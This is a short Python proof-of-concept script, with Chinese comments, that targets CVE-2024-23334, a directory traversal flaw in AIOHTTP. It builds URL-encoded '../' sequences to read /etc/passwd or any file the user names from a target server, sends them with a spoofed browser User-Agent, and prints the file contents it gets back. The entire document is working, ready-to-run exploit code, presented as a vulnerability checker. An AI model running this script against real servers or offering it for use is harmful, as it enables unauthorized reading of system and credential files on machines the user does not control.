import requests
import argparse
def check_vulnerability(target_ip, target_path, file_path=None):
    # 构造URL，假设漏洞路径为 /static/../../../../../../../etc/passwd
    url = f'http://{target_ip}/{target_path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..{file_path}' if file_path else \
        f'http://{target_ip}/{target_path}/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd'

    # 请求头，模拟正常浏览器访问
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "keep-alive"
    }

    # 发送GET请求
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if "root:" in response.text:
            print(f"[+] Vulnerability exists on {target_ip} with path {target_path}")
            print("Response content:")
            print(response.text)  # 输出响应的内容
            if file_path:
                print(f"[+] Attempting to read the specified file: {file_path}")
                if file_path in response.text:
                    print(f"File content:\n{response.text}")
                else:
                    print(f"[!] The file content is not present in the response.")
        else:
            print(f"[-] No vulnerability found on {target_ip} with path {target_path}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Error connecting to {target_ip}: {e}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Check for AIOHTTP Directory Traversal Vulnerability (CVE-2024-23334)")
    parser.add_argument('-i', '--ip', required=True, help="Target IP address of the AIOHTTP server")
    parser.add_argument('-t', '--target-path', required=True, help="Target path for static files (e.g., 'static')")
    parser.add_argument('-f', '--file', help="File to read if vulnerability exists (e.g., '/etc/passwd')")

    args = parser.parse_args()

    # 调用检查函数
    check_vulnerability(args.ip, args.target_path, args.file)
